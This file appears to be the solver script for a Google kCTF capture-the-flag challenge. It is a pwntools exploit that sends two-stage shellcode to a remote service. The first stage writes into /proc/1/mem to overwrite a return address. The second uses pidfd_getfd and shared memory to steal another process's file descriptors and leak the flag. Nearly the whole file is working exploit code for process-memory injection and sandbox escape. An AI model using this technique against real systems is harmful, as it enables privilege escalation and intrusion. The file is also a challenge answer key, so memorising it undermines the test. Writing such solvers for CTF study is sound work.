#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.context
import pwnlib.tubes
import pwnlib.gdb
import pwnlib.util
import pwnlib.util.misc
import pwnlib.shellcraft as sc
from pwnlib.util.packing import *
from pwnlib.asm import asm
from pwnlib.util.fiddling import hexdump
import os

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

def send_payload(r, payload):
    r.sendline(str(len(payload)).encode('ascii'))
    r.send(payload)

pwnlib.context.context.arch = 'amd64'
pwnlib.context.context.bits = 64

def setup_connection(host, port):
#    r = pwnlib.tubes.process.process('../../challenge/chal')
    r = pwnlib.tubes.remote.remote(host, port)
#    r.recvuntil(b'== proof-of-work: ')
#    if r.recvline().startswith(b'enabled'):
#        handle_pow(r)
    return r

debug = False

def DLOG(msg):
    if debug:
        print(msg)

def LOG(msg):
    print(msg)

def rep(v, fd=1):
    return 'movq [rsp], ' + v + '\n' + sc.write(fd, 'rsp', 8)

def err(a, fd=1):
    return a + rep('rax', fd)

def check_err(r, msg):
   LOG('[*] ' + msg)
   err_code = u64(r.recv(8), sign='signed')
   if err_code < 0:
     print('[-] Failed: {}'.format(os.strerror(-err_code)))
     raise RuntimeError("Fail")
   else:
     print('[+] Success: {:x}'.format(err_code))

stage1 = ("mov r13, rsp\n" +
    "sub r13, 160\n" +
    "pushq rax\n" +
    rep('0') +
    rep('r13') +
    err(sc.open('/proc/1/mem', 'O_RDWR') + 'mov r12, rax\n') +
    err(sc.syscall('SYS_lseek', 'r12', 'r13', 'SEEK_SET')) +
    'leaq r13, [rip + stage2]\n' + err(rep('r13', 'r12')) +
    sc.infloop())

stage2 = ('stage2:' +
    sc.syscall('SYS_pidfd_open', 2, 0) + 'mov r12, rax\n' +
    sc.syscall('SYS_pidfd_getfd', 'r12', 0, 0) + 'mov r13, rax\n' +
    sc.read('r13', 'rsp', 1) +
    err(sc.syscall('SYS_pidfd_getfd', 'r12', 1, 0) + 'mov r14, rax\n', 'r14') +
    err(sc.syscall('SYS_shmget', '0xf7a6', '128', '0') + 'mov r12, rax\n', 'r14') +
    err(sc.syscall('SYS_shmat', 'r12', '0', '0') + 'mov r12, rax\n', 'r14') +
    sc.write('r14', 'r12', '128') +
    rep('0', 'r14') +
    sc.linux.exit(0))


def try_to_pwn(r):
    send_payload(r, asm(stage1 + stage2))
    print(r.recvuntil(b'\0'*8))
    frame_addr = u64(r.recv(8))
    LOG('[*] STAGE1'.format(frame_addr))
    LOG('[*] Computed frame address: {:x}'.format(frame_addr))
    check_err(r, 'Opening /proc/1/mem')
    check_err(r, 'Seeking to frame address')
    check_err(r, 'Overriding return address with stage2')
    # proceed with stage 2
    r.write(b'\0')
    LOG('[*] STAGE2'.format(frame_addr))
    check_err(r, 'Reopening stdin & stdout')
    check_err(r, 'Opening shmem')
    check_err(r, 'Attaching shmem')
    flag = r.recvuntil(b'\0'*8, drop=True)
    print(flag)
    return flag

def pwn(host, port, retries=10):
    for i in range(1, retries):
        print('>>> Attempt {}'.format(i))
        try:
          flag = try_to_pwn(setup_connection(host, port))
          if flag:
              return flag
        except:
          pass
    return None

if __name__ == '__main__':
    import sys
    pwn(sys.argv[1], sys.argv[2])
    exit(0)
